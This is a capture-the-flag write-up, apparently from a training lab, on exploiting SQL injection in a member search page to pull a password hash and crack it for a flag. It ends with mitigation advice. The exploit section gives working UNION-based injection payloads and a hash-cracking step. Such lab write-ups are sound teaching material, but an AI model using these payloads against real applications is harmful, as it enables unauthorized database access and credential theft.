# SQL INJECTION

## IDENTIFY THE VULNERABILITY

The member page, accessible at http://192.168.56.2/index.php?page=member, allows users to search for members by ID, providing access to valuable database information. During our investigation, we discovered the 5th member named "Get The Flag," which led us to investigate potential SQL injection vulnerabilities.

Format of SQL query:

```sql
SELECT column_name FROM table_name WHERE condition ORDER BY column_name
```

## EXPLOIT THE VULNERABILITY

Executing the simple query **1 OR 1=1** displayed a list of all users. To explore further, we used the following query to reveal details about tables and columns in the database.

```sql
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

Focusing on the "users" keyword, we identified eight categories within the users table, which include 'user_id', 'first_name', 'last_name', 'town', 'country', 'planet', 'Commentaire' and 'countersign'.

The users table looks like this :

| ID  | First name | Surname     |
| --- | ---------- | ----------- |
| 1   | users      | user_id     |
| 2   | users      | first_name  |
| 3   | users      | last_name   |
| 4   | users      | town        |
| 5   | users      | country     |
| 6   | users      | planet      |
| 7   | users      | Commentaire |
| 8   | users      | countersign |

After several attempts, we used the query :

```sql
1 UNION SELECT countersign, Commentaire FROM users WHERE user_id=5
```

which provided the following information:

> First name: 5ff9d0165b4f92b14994e5c685cdce28

> Surname: Decrypt this password -> then lower all the characters. Apply SHA256, and it's good!

Using Crackstation, we deciphered the password "FortyTwo" (MD5 hash) and then hashed it with SHA256 to obtain the flag.

## INFORMATION ON SQL INJECTION

SQL injection is a malicious technique that enables an attacker to manipulate or interfere with the SQL queries executed by an application to its associated database. This vulnerability can have severe consequences, **_granting unauthorized access to, and control over, the database_**. An attacker exploiting SQL injection may gain the ability to **_read, modify, or delete sensitive data stored in the database_**. This could potentially include compromising users' personal information, accessing email addresses, and obtaining passwords. The impact of SQL injection extends beyond mere unauthorized data access, as it poses a substantial threat to the confidentiality, integrity, and availability of the entire database.

## PATCH THE VULNERABILITY

To reduce the risks associated with SQL injection attacks, consider implementing the following security measures:

1. Input Validation and Parameterized Statements:

   - Validate and sanitize all user inputs on the server side.
   - Use parameterized statements (prepared statements) in SQL queries to separate user input from SQL code.

2. Stored Procedures:

   Utilize stored procedures to encapsulate and execute SQL queries. This adds an additional layer of security by limiting direct access to the database.

3. Least Privilege Principle:

   Ensure that database accounts used by your application have the least privilege necessary to perform their tasks. Avoid using accounts with unnecessary permissions.

4. Whitelisting:

   Implement input whitelisting, allowing only predefined, safe characters or patterns. This helps prevent the injection of malicious SQL code.

5. ORMs and Parameterized Queries:

   If using Object-Relational Mapping (ORM) frameworks, make sure they generate parameterized queries to prevent SQL injection vulnerabilities.

6. Error Handling:

   Implement proper error handling to avoid exposing sensitive information in error messages. Provide generic error messages to users and log detailed errors for administrators.

7. Web Application Firewalls (WAFs):

   Use Web Application Firewalls to filter and monitor HTTP traffic between a web application and the Internet. WAFs can help detect and prevent SQL injection attacks.

## SOURCES

https://portswigger.net/web-security/sql-injection
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
